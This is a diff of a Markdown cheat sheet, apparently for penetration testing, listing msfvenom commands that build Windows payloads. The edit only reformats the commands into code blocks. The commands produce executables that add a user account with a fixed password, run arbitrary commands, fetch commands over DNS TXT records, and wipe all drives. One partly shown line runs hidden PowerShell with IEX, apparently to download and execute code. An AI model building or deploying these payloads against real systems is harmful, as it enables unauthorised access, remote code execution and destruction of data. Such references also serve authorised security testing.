@@ -4,19 +4,25 @@
 
 ### 1.1 - x86 (32-bit) Payloads
 
-`$ msfvenom -p windows/adduser user=<username> pass=Password1234! wmic=[true | false] custom=<group_name>`
+```
+$ msfvenom -p windows/adduser user=<username> pass=Password1234! wmic=[true | false] custom=<group_name>
+```
 
 ## 02 - DNS TXT Query Exec Windows Payload
 
 ### 2.1 - x86 (32-bit) Payloads
 
-`$ msfvenom -p windows/dns_txt_query_exec dnszone=<domain.com> -f exe -o dns-query-x86.exe`
+```
+$ msfvenom -p windows/dns_txt_query_exec dnszone=<domain.com> -f exe -o dns-query-x86.exe
+```
 
 ## 03 - Execute Windows Exec Payload
 
 ### 3.1 - x86 (32-bit) Payloads
 
-`$ msfvenom -p windows/exec cmd=<commands> -f exe -o exec-x86.exe`
+```
+$ msfvenom -p windows/exec cmd=<commands> -f exe -o exec-x86.exe
+```
 
 ### 3.2 - x86-64 (64-bit) Payloads
 
@@ -28,11 +34,15 @@ $ msfvenom -p windows/x64/exec cmd="powershell.exe -w hidden -noni -nop -c \"IEX
 
 ## 04 - Text-To-Speech Windows Exec Payload
 
-`$ msfvenom -p windows/speak_pwned -f exe -o speak-x86.exe`
+```
+$ msfvenom -p windows/speak_pwned -f exe -o speak-x86.exe
+```
 
 ## 05 - Format All Drives Windows Exec Payload
 
-`$ msfvenom -p windows/format_all_drives volumelabel=<label> -f exe -o wiper-x86.exe`
+```
+$ msfvenom -p windows/format_all_drives volumelabel=<label> -f exe -o wiper-x86.exe
+```
 
 ## 06 - Messagebox Windows Exec Payload
 
